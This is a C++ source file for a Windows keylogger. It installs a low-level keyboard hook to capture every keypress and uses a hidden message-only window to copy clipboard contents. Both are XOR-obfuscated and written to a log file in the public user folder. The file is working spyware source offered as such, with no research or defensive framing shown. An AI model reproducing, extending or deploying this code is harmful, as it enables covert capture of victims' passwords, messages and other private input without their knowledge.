#include <keylogger.h>

std::ofstream Keylogger::kblog;
wchar_t* Keylogger::key = nullptr;

Keylogger::Keylogger(wchar_t* k) {
    kblog = std::ofstream("C:\\Users\\Public\\kb_log.txt", std::ios::app);
    key = k;
}

Keylogger::~Keylogger() {
    kblog.close();
}

void Keylogger::XOR(wchar_t* data, int data_len, wchar_t* key, int key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

std::string Keylogger::wstring2utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.data(), (int)wstr.size(), &strTo[0], size_needed, nullptr, nullptr);
    return strTo;
}

wchar_t* Keylogger::vk2ascii(UINT vkCode) {
    static WCHAR buffer[16] = {};

    BYTE keyboardState[256];
    for (int i = 0; i < 256; i++) {
        keyboardState[i] = (BYTE)GetKeyState(i);
    }

    ZeroMemory(buffer, sizeof(buffer));

    UINT scanCode = MapVirtualKeyW(vkCode, MAPVK_VK_TO_VSC);

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 16, 0x04);

    if (result <= 0) return nullptr;

    buffer[result] = L'\0';

    return buffer;
}

LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;

    if (code == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyStruct->vkCode;
            wchar_t* character = vk2ascii(vkCode);
            if (character != nullptr) {
                XOR(character, lstrlenW(character), key, lstrlenW(key));
                kblog << static_cast<char>(*character) << std::endl;
            }
        } 
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

std::wstring Keylogger::GetClipboardText() {
    if (!OpenClipboard(nullptr)) {
        return L"";
    }

    std::wstring text;

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != nullptr) {
        wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
        if (pszText != nullptr) {
            text = pszText;
            GlobalUnlock(hData);
        }
    }

    CloseClipboard();

    return text;
}

LRESULT CALLBACK Keylogger::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_CLIPBOARDUPDATE) {
        std::cout << "New item detected on clipboard! Logged." << std::endl;
        std::wstring content = GetClipboardText();
        // XOR(content.data(), content.length(), key, lstrlenW(key));
        XOR(&content[0], content.length(), key, lstrlenW(key));
        kblog << wstring2utf8(content) << std::endl;
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

HWND Keylogger::CreateCbWindow() {
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"MonitorClass";
    RegisterClassW(&wc);

    return CreateWindowExW(0, L"MonitorClass", L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
}